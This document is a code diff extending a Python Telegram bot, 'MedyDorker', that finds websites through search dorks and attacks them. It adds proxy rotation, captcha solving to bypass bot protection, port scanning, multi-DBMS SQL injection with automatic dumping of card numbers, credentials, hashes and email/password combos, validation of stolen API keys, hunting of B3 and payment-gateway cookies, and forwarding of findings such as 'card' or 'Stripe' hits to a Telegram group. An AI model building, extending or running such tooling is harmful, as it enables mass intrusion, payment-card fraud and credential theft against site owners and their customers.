@@ -26,9 +26,14 @@ Commands:
     /secrets        — List found secrets/keys
     /dumps          — List data dumps
     /cookies        — List extracted cookies (b3, session, auth)
+    /cookiehunt <url> — Actively hunt URL for B3 + gateway cookies
     /categories     — List available dork categories
     /target <cat>   — Run targeted scan for a category
     /scan <url>     — Scan a single URL
+    /mass url1 url2  — Mass scan up to 25 URLs
+    /authscan <url> cookies — Authenticated scan behind login walls
+    /setgroup        — Set this chat as findings report group
+    /export          — Export all findings to .txt now
     /deepscan <url> — Deep scan a URL (crawl + extract + SQLi)
 """
 
@@ -70,6 +75,36 @@ from sqli_dumper import SQLiDumper, DumpedData
 from secret_extractor import SecretExtractor, ExtractedSecret
 from reporter import TelegramReporter
 from persistence import DorkerDB
+from captcha_solver import CaptchaSolver, SitekeyExtractor
+from proxy_manager import ProxyManager
+from browser_engine import BrowserManager, _HAS_PLAYWRIGHT, flaresolverr_crawl, spa_extract, spa_extract_with_flaresolverr, SPAExtractionResult
+from cookie_hunter import CookieHunter
+from ecommerce_checker import EcommerceChecker
+from recursive_crawler import RecursiveCrawler, CrawlPage, CrawlResult, generate_seed_urls
+from port_scanner import PortScanner, PortScanResult
+from oob_sqli import OOBInjector, OOBResult
+from union_dumper import MultiUnionDumper, UnionDumpResult
+from key_validator import KeyValidator, KeyValidation
+from ml_filter import MLFilter, FilterResult
+from js_analyzer import JSBundleAnalyzer, JSAnalysisResult, analyze_js_bundles
+from api_bruteforcer import APIBruteforcer, BruteforceResult, bruteforce_api
+from hint_engine import (
+    get_cookie_hint, get_secret_hint, get_endpoint_hint,
+    get_waf_hint, get_port_hint, get_sqli_hint, get_dump_hint,
+    get_contextual_hints, CMS_HINTS, WAF_BYPASS_HINTS
+)
+
+# Extended vulnerability scanners (v3.17)
+from xss_scanner import XSSScanner, XSSResult
+from ssti_scanner import SSTIScanner, SSTIResult
+from nosql_scanner import NoSQLScanner, NoSQLResult
+from lfi_scanner import LFIScanner, LFIResult
+from ssrf_scanner import SSRFScanner, SSRFResult
+from cors_scanner import CORSScanner, CORSResult
+from redirect_scanner import OpenRedirectScanner, RedirectResult
+from crlf_scanner import CRLFScanner, CRLFResult
+from auto_dumper import AutoDumper, ParsedDumpData
+from dump_parser import DumpParser
 
 
 class MedyDorkerPipeline:
@@ -89,6 +124,59 @@ class MedyDorkerPipeline:
             engines=self.config.engines,
             max_pages=self.config.search_max_pages,
         )
+        
+        # Proxy manager (Phase 2)
+        self.proxy_manager = None
+        if self.config.use_proxies:
+            proxy_files = getattr(self.config, 'proxy_files', [])
+            # Legacy fallback: if no proxy_files list, use single proxy_file
+            if not proxy_files and self.config.proxy_file:
+                proxy_files = [self.config.proxy_file]
+            self.proxy_manager = ProxyManager(
+                proxy_files=proxy_files,
+                strategy=getattr(self.config, 'proxy_rotation_strategy', 'weighted'),
+                ban_threshold=getattr(self.config, 'proxy_ban_threshold', 5),
+                ban_duration=getattr(self.config, 'proxy_ban_duration', 600),
+                country_filter=getattr(self.config, 'proxy_country_filter', []),
+                sticky_per_domain=getattr(self.config, 'proxy_sticky_per_domain', 3),
+                health_check=getattr(self.config, 'proxy_health_check', True),
+                health_check_interval=getattr(self.config, 'proxy_health_interval', 300),
+                health_check_timeout=getattr(self.config, 'proxy_health_timeout', 10),
+                protocol=getattr(self.config, 'proxy_protocol', 'http'),
+                enabled=True,
+            )
+            self.searcher.proxy_manager = self.proxy_manager
+        
+        # Configure Firecrawl in search engine
+        if self.config.firecrawl_enabled and self.config.firecrawl_api_key:
+            self.searcher.firecrawl_api_key = self.config.firecrawl_api_key
+            self.searcher.firecrawl_search_limit = self.config.firecrawl_search_limit
+            self.searcher.firecrawl_as_fallback = self.config.firecrawl_as_fallback
+            if not self.config.firecrawl_as_fallback and "firecrawl" not in self.config.engines:
+                self.config.engines.insert(0, "firecrawl")
+                self.searcher.engine_names.insert(0, "firecrawl")
+            logger.info("🔥 Firecrawl search engine enabled")
+        
+        # Captcha solver (Phase 1)
+        self.captcha_solver = None
+        _any_captcha_key = (self.config.captcha_twocaptcha_key or
+                           self.config.captcha_nopecha_key or
+                           self.config.captcha_anticaptcha_key)
+        if self.config.captcha_enabled and _any_captcha_key:
+            self.captcha_solver = CaptchaSolver(
+                twocaptcha_key=self.config.captcha_twocaptcha_key,
+                nopecha_key=self.config.captcha_nopecha_key,
+                anticaptcha_key=self.config.captcha_anticaptcha_key,
+                provider_order=self.config.captcha_provider_order,
+                enabled=self.config.captcha_enabled,
+                max_solve_time=float(self.config.captcha_max_solve_time),
+                auto_solve_search=self.config.captcha_auto_solve_search,
+                auto_solve_target=self.config.captcha_auto_solve_target,
+            )
+            self.searcher.captcha_solver = self.captcha_solver
+            providers = ", ".join(self.captcha_solver.provider_names)
+            logger.info(f"🧩 Captcha solver enabled — providers: {providers}")
+        
         self.waf_detector = WAFDetector(
             timeout=self.config.waf_timeout,
             max_concurrent=self.config.waf_max_concurrent,
@@ -103,6 +191,9 @@ class MedyDorkerPipeline:
             output_dir=self.config.dumper_output_dir,
             max_rows=self.config.dumper_max_rows,
             timeout=self.config.dumper_timeout,
+            blind_enabled=self.config.dumper_blind_enabled,
+            blind_time_delay=self.config.dumper_blind_delay,
+            blind_max_rows=self.config.dumper_blind_max_rows,
         )
         self.secret_extractor = SecretExtractor(
             timeout=self.config.secret_timeout,
@@ -117,6 +208,142 @@ class MedyDorkerPipeline:
         
         # SQLite persistence
         self.db = DorkerDB(self.config.sqlite_db_path)
+        
+        # Firecrawl engine instance for scrape/crawl (not just search)
+        self._firecrawl_engine = None
+        if self.config.firecrawl_enabled and self.config.firecrawl_api_key:
+            from engines import FirecrawlSearch
+            self._firecrawl_engine = FirecrawlSearch(
+                api_key=self.config.firecrawl_api_key,
+                search_limit=self.config.firecrawl_search_limit,
+            )
+        
+        # Cookie Hunter (Phase 3 — v3.5)
+        self.cookie_hunter = None
+        if getattr(self.config, 'cookie_hunter_enabled', True):
+            self.cookie_hunter = CookieHunter(
+                config=self.config,
+                reporter=self.reporter,
+                db=self.db,
+                proxy_manager=self.proxy_manager,
+            )
+            logger.info("🍪 Cookie Hunter enabled — hunting B3 + gateway cookies")
+        
+        # E-commerce checker (Phase 3 — v3.8)
+        self.ecom_checker = None
+        if getattr(self.config, 'ecom_checker_enabled', True):
+            self.ecom_checker = EcommerceChecker(
+                config=self.config,
+                reporter=self.reporter,
+                db=self.db,
+                proxy_manager=self.proxy_manager,
+            )
+            logger.info("🛍️ E-commerce checker enabled — Shopify/WooCommerce/Magento/PrestaShop/OpenCart")
+
+        # Recursive crawler (Phase 3 — v3.9 depth control)
+        self.crawler = None
+        if getattr(self.config, 'deep_crawl_enabled', True):
+            self.crawler = RecursiveCrawler(
+                config=self.config,
+                proxy_manager=self.proxy_manager,
+            )
+            logger.info(
+                f"🕸️ Recursive crawler enabled — depth={self.config.deep_crawl_max_depth}, "
+                f"max_pages={self.config.deep_crawl_max_pages}"
+            )
+
+        # Browser engine (Phase 3 — v3.7 search resilience)
+        self.browser_manager = None
+        if self.config.browser_enabled and _HAS_PLAYWRIGHT:
+            self.browser_manager = BrowserManager(
+                headless=self.config.browser_headless,
+                max_concurrent=self.config.browser_max_concurrent,
+                page_timeout=self.config.browser_page_timeout,
+            )
+            self.searcher.browser_manager = self.browser_manager
+            self.searcher.browser_fallback_enabled = True
+            self.searcher.browser_engines = self.config.browser_engines
+            logger.info("🌐 Headless browser engine enabled (Playwright/Chromium)")
+        elif self.config.browser_enabled and not _HAS_PLAYWRIGHT:
+            logger.warning("🌐 Browser engine requested but Playwright not installed: pip install playwright && playwright install chromium")
+        
+        # Port Scanner (Phase 4 — v3.10)
+        self.port_scanner = None
+        if getattr(self.config, 'port_scan_enabled', True):
+            self.port_scanner = PortScanner(
+                config=self.config,
+                reporter=self.reporter,
+                db=self.db,
+            )
+            logger.info("🔍 Port scanner enabled")
+        
+        # OOB SQLi Injector (Phase 4 — v3.11)
+        self.oob_injector = None
+        if getattr(self.config, 'oob_sqli_enabled', False):
+            self.oob_injector = OOBInjector(
+                config=self.config,
+                reporter=self.reporter,
+                db=self.db,
+            )
+            logger.info("📡 OOB SQLi injector enabled")
+        
+        # Multi-DBMS Union Dumper (Phase 4 — v3.12)
+        self.union_dumper = None
+        if getattr(self.config, 'union_dump_enabled', True):
+            self.union_dumper = MultiUnionDumper(
+                config=self.config,
+                scanner=self.sqli_scanner,
+            )
+            logger.info("🗃️ Multi-DBMS union dumper enabled (MySQL/MSSQL/PostgreSQL/Oracle/SQLite)")
+        
+        # API Key Validator (Phase 4 — v3.13)
+        self.key_validator = None
+        if getattr(self.config, 'key_validation_enabled', True):
+            self.key_validator = KeyValidator(
+                config=self.config,
+                reporter=self.reporter,
+                db=self.db,
+            )
+            logger.info("🔑 API key validator enabled (16 key types)")
+        
+        # ML False Positive Filter (Phase 4 — v3.14)
+        self.ml_filter = None
+        if getattr(self.config, 'ml_filter_enabled', True):
+            self.ml_filter = MLFilter(
+                config=self.config,
+                db=self.db,
+            )
+            self.ml_filter.bootstrap_training()
+            logger.info("🧠 ML false positive filter enabled (gradient boosted trees)")
+        
+        # Extended Vulnerability Scanners (v3.17)
+        self.xss_scanner = XSSScanner(config=self.config) if getattr(self.config, 'xss_enabled', True) else None
+        self.ssti_scanner = SSTIScanner(config=self.config) if getattr(self.config, 'ssti_enabled', True) else None
+        self.nosql_scanner = NoSQLScanner(config=self.config) if getattr(self.config, 'nosql_enabled', True) else None
+        self.lfi_scanner = LFIScanner(config=self.config) if getattr(self.config, 'lfi_enabled', True) else None
+        self.ssrf_scanner = SSRFScanner(config=self.config) if getattr(self.config, 'ssrf_enabled', True) else None
+        self.cors_scanner = CORSScanner(config=self.config) if getattr(self.config, 'cors_enabled', True) else None
+        self.redirect_scanner = OpenRedirectScanner(config=self.config) if getattr(self.config, 'redirect_enabled', True) else None
+        self.crlf_scanner = CRLFScanner(config=self.config) if getattr(self.config, 'crlf_enabled', True) else None
+        _ext_count = sum(1 for s in [self.xss_scanner, self.ssti_scanner, self.nosql_scanner, self.lfi_scanner, self.ssrf_scanner, self.cors_scanner, self.redirect_scanner, self.crlf_scanner] if s)
+        if _ext_count:
+            logger.info(f"🎯 Extended vuln scanners enabled: {_ext_count}/8 (XSS/SSTI/NoSQL/LFI/SSRF/CORS/Redirect/CRLF)")
+        
+        # Auto Dumper — unified dump orchestrator (v3.18)
+        self.auto_dumper = None
+        if getattr(self.config, 'auto_dump_enabled', True):
+            self.auto_dumper = AutoDumper(
+                config=self.config,
+                dumper=self.dumper,
+                union_dumper=self.union_dumper,
+                oob_injector=self.oob_injector,
+                reporter=self.reporter,
+                db=self.db,
+                key_validator=self.key_validator,
+                secret_extractor=self.secret_extractor,
+            )
+            self.dump_parser = DumpParser()  # Standalone dump parser for external files
+            logger.info("📦 Auto Dumper v1.0 enabled (inject → dump → parse → report pipeline)")
         
         # In-memory state (synced to DB)
         self.seen_domains: Set[str] = set()
@@ -136,6 +363,15 @@ class MedyDorkerPipeline:
         
         # Content hash dedup (in-memory cache, backed by DB)
         self._content_hashes: Set[str] = set()
+        
+        # Report group forwarding (set via /setgroup)
+        self._report_chat_id: Optional[int] = None
+        
+        # Hourly export directory
+        self._export_dir = os.path.join(os.path.dirname(__file__), "exports")
+        os.makedirs(self._export_dir, exist_ok=True)
+        self._last_export_time: Optional[datetime] = None
+        self._export_counter = 0
         
         # Load previous state
         self._load_state()
@@ -306,6 +542,23 @@ class MedyDorkerPipeline:
         self._bot = bot
         self._chat_id = chat_id
 
+    def set_report_group(self, chat_id: int):
+        """Set a group/channel to receive all findings."""
+        self._report_chat_id = chat_id
+        logger.info(f"Report group set: {chat_id}")
+
+    async def _send_to_report_group(self, text: str):
+        """Forward a finding to the dedicated report group."""
+        if self._bot and self._report_chat_id:
+            try:
+                await self._bot.send_message(
+                    chat_id=self._report_chat_id,
+                    text=text,
+                    parse_mode="HTML",
+                )
+            except Exception as e:
+                logger.debug(f"Report group send failed: {e}")
+
     async def _send_progress(self, text: str):
         """Send a progress update to the user's chat."""
         if self._bot and self._chat_id:
@@ -317,6 +570,13 @@ class MedyDorkerPipeline:
                 )
             except Exception as e:
                 logger.error(f"Progress send failed: {e}")
+        # Also forward findings (HIT / vuln / secret / dump) to report group
+        if self._report_chat_id and self._report_chat_id != self._chat_id:
+            keywords = ("HIT", "SQLi", "vuln", "secret", "dump", "card", "gateway",
+                        "B3", "injectable", "CRITICAL", "FlareSolverr got", "GCP",
+                        "Twilio", "AWS", "Stripe", "API Key")
+            if any(kw.lower() in text.lower() for kw in keywords):
+                await self._send_to_report_group(text)
 
     async def process_url(self, url: str) -> Dict:
         """Process a single URL through the full pipeline.
@@ -342,6 +602,17 @@ class MedyDorkerPipeline:
             "sqli": [],
             "dumps": [],
             "cookies": {},
+            "ports": [],
+            "oob": [],
+            "key_validations": [],
+            "xss": [],
+            "ssti": [],
+            "nosql": [],
+            "lfi": [],
+            "ssrf": [],
+            "cors": [],
+            "redirects": [],
+            "crlf": [],
         }
         
         domain = urlparse(url).netloc
@@ -377,13 +648,46 @@ class MedyDorkerPipeline:
                             "cms": waf_info.cms,
                         }
                         
-                        # Skip if too protected
+                        # Skip if too protected (unless captcha can be solved)
+                        should_skip = False
                         if self.config.waf_skip_extreme and waf_info.risk_level == "extreme":
-                            logger.info(f"Skipping {url} — extreme protection ({waf_info.waf or waf_info.bot_protection})")
-                            return result
+                            should_skip = True
                         if self.config.waf_skip_high and waf_info.risk_level == "high":
-                            logger.info(f"Skipping {url} — high protection ({waf_info.waf})")
+                            should_skip = True
+                        
+                        # Attempt captcha solving if bot protection detected
+                        if waf_info.bot_protection and self.captcha_solver and self.captcha_solver.auto_solve_target:
+                            from captcha_solver import SitekeyExtractor
+                            captcha_type = SitekeyExtractor.detect_type_from_name(waf_info.bot_protection)
+                            if captcha_type:
+                                logger.info(f"Bot protection ({waf_info.bot_protection}) on {url} — attempting captcha solve")
+                                # Fetch page HTML for sitekey extraction
+                                try:
+                                    async with session.get(url, ssl=False) as captcha_resp:
+                                        captcha_html = await captcha_resp.text()
+                                    solve_result = await self.captcha_solver.solve_from_html(captcha_html, url)
+                                    if solve_result.success:
+                                        logger.info(f"Captcha solved for {url} via {solve_result.provider} — proceeding")
+                                        should_skip = False  # Override skip, we solved the captcha
+                                except Exception as e:
+                                    logger.debug(f"Captcha solve attempt failed for {url}: {e}")
+                        
+                        if should_skip:
+                            logger.info(f"Skipping {url} — {waf_info.risk_level} protection ({waf_info.waf or waf_info.bot_protection})")
                             return result
+                    
+                    # Step 1b: Port Scanning (v3.10)
+                    if self.port_scanner:
+                        try:
+                            port_result = await self.port_scanner.scan_and_report(url)
+                            if port_result and port_result.open_ports:
+                                result["ports"] = [
+                                    {"port": p.port, "service": p.service, "banner": p.banner,
+                                     "version": p.version, "risk": p.risk}
+                                    for p in port_result.open_ports
+                                ]
+                        except Exception as e:
+                            logger.debug(f"Port scan failed: {e}")
                     
                     # Step 2: Cookie Extraction
                     if self.config.cookie_extraction_enabled:
@@ -411,10 +715,125 @@ class MedyDorkerPipeline:
                         except Exception as e:
                             logger.debug(f"Cookie extraction failed: {e}")
                     
-                    # Step 3: Secret Extraction (deep — checks payment pages too)
+                    # Step 2b: Cookie Hunter — active B3 + gateway probing
+                    if self.cookie_hunter:
+                        try:
+                            hunt_result = await self.cookie_hunter.hunt_and_report(url, session)
+                            if hunt_result.total_finds > 0:
+                                result["cookie_hunt"] = {
+                                    "b3": [{"name": f.cookie_name, "value": f.cookie_value, "source": f.source}
+                                           for f in hunt_result.b3_finds],
+                                    "gateway": [{"name": f.cookie_name, "value": f.cookie_value,
+                                                 "gateway": f.gateway, "source": f.source}
+                                                for f in hunt_result.gateway_finds],
+                                    "commerce": [{"name": f.cookie_name, "value": f.cookie_value}
+                                                 for f in hunt_result.commerce_finds],
+                                    "detected_gateways": hunt_result.detected_gateways,
+                                }
+                                # Update reporter stats
+                                self.reporter.stats.b3_cookies_found += len(hunt_result.b3_finds)
+                                self.reporter.stats.gateway_cookies_found += len(hunt_result.gateway_finds)
+                                self.reporter.stats.commerce_cookies_found += len(hunt_result.commerce_finds)
+                        except Exception as e:
+                            logger.debug(f"Cookie hunter failed: {e}")
+                    
+                    # Step 2c: E-commerce platform check (Shopify/WooCommerce/Magento)
+                    if self.ecom_checker:
+                        try:
+                            ecom_result = await self.ecom_checker.check_and_report(url, session)
+                            if ecom_result.total_findings > 0:
+                                result["ecommerce"] = {
+                                    "platform": ecom_result.primary_platform.name if ecom_result.primary_platform else None,
+                                    "confidence": ecom_result.primary_platform.confidence if ecom_result.primary_platform else 0,
+                                    "findings": len(ecom_result.findings),
+                                    "gateways": [gf.data.get("gateway", "") for gf in ecom_result.gateway_plugins],
+                                    "secrets": len(ecom_result.secrets_found),
+                                }
+                        except Exception as e:
+                            logger.debug(f"E-commerce check failed: {e}")
+
+                    # Step 3: Recursive Crawl + Secret Extraction
+                    # BFS crawl discovers pages → extract secrets from each page in real time
+                    crawl_result = None
+                    discovered_param_urls: Set[str] = set()
+                    
                     if self.config.secret_extraction_enabled:
-                        scan_data = await self.secret_extractor.deep_extract_site(url, session)
-                        secrets = scan_data.get("secrets", []) if isinstance(scan_data, dict) else scan_data
+                        secrets: list = []
+                        
+                        if self.crawler and self.config.deep_crawl_enabled:
+                            # --- v3.9 Recursive Crawler ---
+                            async def _on_crawl_page(page: CrawlPage):
+                                """Real-time secret extraction as pages are crawled."""
+                                if page.html:
+                                    page_secrets = self.secret_extractor.extract_from_text(
+                                        page.html, page.url,
+                                    )
+                                    if page_secrets:
+                                        secrets.extend(page_secrets)
+                            
+                            crawl_result = await self.crawler.quick_crawl(
+                                url,
+                                session=session,
+                                max_depth=min(self.config.deep_crawl_max_depth, 2),
+                                max_pages=min(self.config.deep_crawl_max_pages, 30),
+                                on_page=_on_crawl_page,
+                            )
+                            
+                            # ── FlareSolverr fallback: if aiohttp got very few pages ──
+                            if crawl_result.total_fetched <= 2:
+                                logger.info(
+                                    f"[FlareFallback] aiohttp only got {crawl_result.total_fetched} pages "
+                                    f"for {url}, trying FlareSolverr crawl..."
+                                )
+                                try:
+                                    flare_result = await flaresolverr_crawl(
+                                        seed_url=url,
+                                        max_pages=min(self.config.deep_crawl_max_pages, 30),
+                                        max_depth=min(self.config.deep_crawl_max_depth, 2),
+                                    )
+                                    if flare_result.total_fetched > crawl_result.total_fetched:
+                                        logger.info(
+                                            f"[FlareFallback] FlareSolverr got {flare_result.total_fetched} pages "
+                                            f"(vs aiohttp {crawl_result.total_fetched}), using FlareSolverr result"
+                                        )
+                                        # Run secret extraction on FlareSolverr-crawled pages
+                                        for bp in flare_result.html_pages:
+                                            if bp.html:
+                                                page_secrets = self.secret_extractor.extract_from_text(
+                                                    bp.html, bp.url,
+                                                )
+                                                if page_secrets:
+                                                    secrets.extend(page_secrets)
+                                        crawl_result = flare_result
+                                    else:
+                                        logger.info("[FlareFallback] No improvement, keeping aiohttp result")
+                                except Exception as e:
+                                    logger.warning(f"[FlareFallback] FlareSolverr crawl failed: {e}")
+                            
+                            discovered_param_urls = crawl_result.param_urls
+                            
+                            # Store crawl cookies
+                            for cname, cval in crawl_result.all_cookies.items():
+                                if cname not in result.get("cookies", {}).get("all", {}):
+                                    self.db.add_cookie(url, cname, cval, "crawl")
+                            for cname, cval in crawl_result.b3_cookies.items():
+                                self.db.add_b3_cookie(url, cname, cval)
+                                logger.info(f"🔵 B3 cookie via crawl: {cname} at {url}")
+                            
+                            result["crawl"] = {
+                                "pages_fetched": crawl_result.total_fetched,
+                                "max_depth": crawl_result.max_depth_reached,
+                                "urls_discovered": len(crawl_result.all_urls),
+                                "param_urls": len(crawl_result.param_urls),
+                                "forms": len(crawl_result.form_targets),
+                                "cookies": len(crawl_result.all_cookies),
+                                "b3_cookies": len(crawl_result.b3_cookies),
+                            }
+                        else:
+                            # --- Fallback: flat deep_extract_site ---
+                            scan_data = await self.secret_extractor.deep_extract_site(url, session)
+                            secrets = scan_data.get("secrets", []) if isinstance(scan_data, dict) else scan_data
+                        
                         if secrets:
                             result["secrets"] = [
                                 {"type": s.type, "name": s.key_name, "value": s.value, "category": s.category}
@@ -458,8 +877,10 @@ class MedyDorkerPipeline:
                                         )
                     
                     # Step 4: SQLi Testing (now with cookie/header/POST injection + WAF bypass)
+                    # Also test param URLs discovered by the recursive crawler
                     if self.config.sqli_enabled:
                         sqli_results = await self.sqli_scanner.scan(
+
                             url, session,
                             waf_name=waf_name,
                             protection_info=waf_info,
@@ -510,56 +931,471 @@ class MedyDorkerPipeline:
                                     }
                                 )
                                 
-                                # Step 5: Data Dumping (if union-based injection found)
-                                if self.config.dumper_enabled and sqli.injection_type == "union":
-                                    dump = await self.dumper.targeted_dump(sqli, session)
-                                    if dump.has_valuable_data or dump.total_rows > 0:
-                                        saved = self.dumper.save_dump(dump)
-                                        result["dumps"].append({
-                                            "tables": len(dump.tables),
-                                            "rows": dump.total_rows,
-                                            "cards": len(dump.card_data),
-                                            "creds": len(dump.credentials),
-                                            "keys": len(dump.gateway_keys),
-                                            "files": saved,
-                                        })
-                                        
-                                        # Report dump
-                                        await self.reporter.report_data_dump(
-                                            url, dump.dbms, dump.database,
-                                            dump.tables,
-                                            {t: len(rows) for t, rows in dump.data.items()},
-                                            saved,
-                                        )
-                                        
-                                        # Report card data specifically
-                                        if dump.card_data:
-                                            self.found_cards.extend(dump.card_data)
-                                            for card in dump.card_data:
-                                                self.db.add_card_data(url, card)
-                                            await self.reporter.report_card_data(url, dump.card_data)
-                                        
-                                        # Report gateway keys from dump
-                                        for key_entry in dump.gateway_keys:
-                                            for col, val in key_entry.items():
+                                # Step 5: Unified Auto-Dump (v3.18 — replaces old steps 5/5b)
+                                # Uses AutoDumper to chain: best-dumper-selection → dump → deep-parse
+                                # → key validation → hash ID → combo gen → file gen → TG upload → deeper tables
+                                if self.config.dumper_enabled and self.auto_dumper:
+                                    try:
+                                        parsed = await self.auto_dumper.auto_dump(sqli, session)
+                                        if parsed and parsed.total_rows > 0:
+                                            result["dumps"].append({
+                                                "source": parsed.source,
+                                                "tables": len(parsed.tables_dumped),
+                                                "rows": parsed.total_rows,
+                                                "cards": len(parsed.cards),
+                                                "creds": len(parsed.credentials),
+                                                "keys": len(parsed.gateway_keys),
+                                                "secrets": len(parsed.secrets),
+                                                "valid_keys": len(parsed.valid_keys),
+                                                "hashes": len(parsed.hashes),
+                                                "emails": len(parsed.emails),
+                                                "combos": len(parsed.combos_user_pass) + len(parsed.combos_email_pass),
+                                                "files": list(parsed.files.keys()),
+                                            })
+                                            # Sync high-value finds to in-memory state
+                                            if parsed.cards:
+                                                self.found_cards.extend(parsed.cards)
+                                            for key_entry in parsed.gateway_keys:
                                                 self.found_gateways.append({
                                                     "url": url,
-                                                    "type": f"db_{col}",
-                                                    "value": val,
-                                                    "source": "sqli_dump",
+                                                    "type": key_entry.get("type", "db_key"),
+                                                    "value": key_entry.get("value", ""),
+                                                    "source": f"auto_dump_{parsed.source}",
                                                     "time": datetime.now().isoformat(),
                                                 })
-                                                self.db.add_gateway_key(
-                                                    url, f"db_{col}", val,
-                                                    source="sqli_dump",
+                                            for vk in parsed.valid_keys:
+                                                self.found_gateways.append({
+                                                    "url": url,
+                                                    "type": vk.get("type", "validated_key"),
+                                                    "value": vk.get("value", ""),
+                                                    "source": "auto_dump_validated",
+                                                    "time": datetime.now().isoformat(),
+                                                })
+                                    except Exception as e:
+                                        logger.warning(f"Auto-dump error for {url}: {e}")
+                                        # Fallback to legacy dumper on auto_dump failure
+                                        if sqli.injection_type == "union":
+                                            dump = await self.dumper.targeted_dump(sqli, session)
+                                            if dump.has_valuable_data or dump.total_rows > 0:
+                                                saved = self.dumper.save_dump(dump)
+                                                result["dumps"].append({
+                                                    "tables": len(dump.tables),
+                                                    "rows": dump.total_rows,
+                                                    "cards": len(dump.card_data),
+                                                    "files": saved,
+                                                })
+                                                await self.reporter.report_data_dump(
+                                                    url, dump.dbms, dump.database,
+                                                    dump.tables,
+                                                    {t: len(rows) for t, rows in dump.data.items()},
+                                                    saved,
                                                 )
-                                                await self.reporter.report_gateway(
-                                                    url, f"DB: {col}", val,
-                                                    {"source": "SQL injection dump"}
-                                                )
+                                
+                                # Legacy fallback: if auto_dumper disabled, use old path
+                                elif self.config.dumper_enabled and not self.auto_dumper:
+                                    if sqli.injection_type == "union":
+                                        dump = await self.dumper.targeted_dump(sqli, session)
+                                        if dump.has_valuable_data or dump.total_rows > 0:
+                                            saved = self.dumper.save_dump(dump)
+                                            result["dumps"].append({
+                                                "tables": len(dump.tables), "rows": dump.total_rows,
+                                                "cards": len(dump.card_data), "files": saved,
+                                            })
+                                            await self.reporter.report_data_dump(
+                                                url, dump.dbms, dump.database, dump.tables,
+                                                {t: len(rows) for t, rows in dump.data.items()}, saved,
+                                            )
+                                    elif (self.config.dumper_blind_enabled and
+                                          sqli.injection_type in ("boolean", "time")):
+                                        dump = await self.dumper.blind_targeted_dump(sqli, session)
+                                        if dump.has_valuable_data or dump.total_rows > 0:
+                                            saved = self.dumper.save_dump(dump, prefix="blind_")
+                                            result["dumps"].append({
+                                                "type": f"blind_{sqli.injection_type}",
+                                                "tables": len(dump.tables), "rows": dump.total_rows,
+                                                "files": saved,
+                                            })
                     
+                    # Step 6: SQLi on crawler-discovered param URLs (v3.9)
+                    if (self.config.sqli_enabled and discovered_param_urls and 
+                            self.crawler and crawl_result):
+                        crawl_sqli_limit = getattr(self.config, 'deep_crawl_sqli_limit', 5)
+                        # Filter out the original URL (already tested above)
+                        extra_targets = [u for u in discovered_param_urls if u != url]
+                        if extra_targets:
+                            extra_targets = extra_targets[:crawl_sqli_limit]
+                            for extra_url in extra_targets:
+                                try:
+                                    extra_sqli = await self.sqli_scanner.scan(
+                                        extra_url, session,
+                                        waf_name=waf_name,
+                                        protection_info=waf_info,
+                                    )
+                                    if extra_sqli:
+                                        for sqli in extra_sqli:
+                                            vuln_record = {
+                                                "url": extra_url,
+                                                "param": sqli.parameter,
+                                                "type": sqli.injection_type,
+                                                "dbms": sqli.dbms,
+                                                "technique": sqli.technique,
+                                                "injection_point": sqli.injection_point,
+                                                "confidence": sqli.confidence,
+                                                "db_version": sqli.db_version,
+                                                "current_db": sqli.current_db,
+                                                "current_user": sqli.current_user,
+                                                "column_count": sqli.column_count,
+                                                "payload_used": sqli.payload_used,
+                                                "time": datetime.now().isoformat(),
+                                                "source": "recursive_crawl",
+                                            }
+                                            self.vulnerable_urls.append(vuln_record)
+                                            self.db.add_vulnerable_url(vuln_record)
+                                            result["sqli"].append({
+                                                "param": sqli.parameter,
+                                                "type": sqli.injection_type,
+                                                "dbms": sqli.dbms,
+                                                "technique": sqli.technique,
+                                                "columns": sqli.column_count,
+                                                "db_version": sqli.db_version,
+                                                "current_db": sqli.current_db,
+                                                "injection_point": sqli.injection_point,
+                                                "source_url": extra_url,
+                                            })
+                                            await self.reporter.report_sqli_vuln(
+                                                extra_url, sqli.parameter, sqli.dbms,
+                                                sqli.injection_type,
+                                                {
+                                                    "db_version": sqli.db_version,
+                                                    "current_db": sqli.current_db,
+                                                    "column_count": sqli.column_count,
+                                                    "injection_point": sqli.injection_point,
+                                                    "source": "Discovered via recursive crawl",
+                                                }
+                                            )
+                                except Exception as e:
+                                    logger.debug(f"Crawl-discovered SQLi test failed for {extra_url}: {e}")
+
+                    # Step 7: ML False Positive Filter on SQLi results (v3.14)
+                    if self.ml_filter and result.get("sqli"):
+                        filtered_sqli = []
+                        for sqli_entry in result["sqli"]:
+                            # Build a lightweight object the ML filter can read attrs from
+                            class _SQLiProxy:
+                                pass
+                            proxy = _SQLiProxy()
+                            proxy.url = sqli_entry.get("source_url", url)
+                            proxy.parameter = sqli_entry.get("param", "")
+                            proxy.injection_type = sqli_entry.get("type", "")
+                            proxy.dbms = sqli_entry.get("dbms", "")
+                            proxy.confidence = sqli_entry.get("confidence", 0.5)
+                            proxy.column_count = sqli_entry.get("columns", 0)
+                            proxy.payload_used = sqli_entry.get("payload_used", "")
+                            proxy.technique = sqli_entry.get("technique", "")
+                            proxy.db_version = sqli_entry.get("db_version", "")
+                            try:
+                                fr = self.ml_filter.filter_sqli(sqli_result=proxy)
+                                if fr.is_positive:
+                                    sqli_entry["ml_confidence"] = fr.confidence
+                                    filtered_sqli.append(sqli_entry)
+                                else:
+                                    logger.info(f"🧠 ML filter rejected SQLi on {url} param={sqli_entry.get('param')} "
+                                               f"(score={fr.score:.2f}, threshold={self.config.ml_filter_threshold})")
+                            except Exception as e:
+                                logger.debug(f"ML filter error: {e}")
+                                filtered_sqli.append(sqli_entry)  # Keep on error
+                        result["sqli"] = filtered_sqli
+
+                    # Step 8: OOB SQLi Testing (v3.11)
+                    if self.oob_injector and self.config.sqli_enabled:
+                        try:
+                            oob_result = await self.oob_injector.test_and_report(url, session)
+                            if oob_result and oob_result.vulnerable:
+                                result["oob"].append({
+                                    "parameter": oob_result.parameter,
+                                    "dbms": oob_result.dbms,
+                                    "channel": oob_result.channel,
+                                    "extraction": oob_result.extraction,
+                                    "callbacks": oob_result.callbacks_received,
+                                })
+                        except Exception as e:
+                            logger.debug(f"OOB SQLi test failed: {e}")
+
+                    # Step 9: Enhanced Union Dumping for non-MySQL DBMS (v3.12)
+                    if self.union_dumper and result.get("sqli"):
+                        for sqli_entry in result["sqli"]:
+                            dbms = sqli_entry.get("dbms", "").lower()
+                            # Use multi-DBMS dumper for confirmed union SQLi
+                            if sqli_entry.get("type") == "union" and dbms in ("mssql", "postgresql", "oracle", "sqlite"):
+                                try:
+                                    union_result = await self.union_dumper.dump(
+                                        url=sqli_entry.get("source_url", url),
+                                        parameter=sqli_entry.get("param", ""),
+                                        session=session,
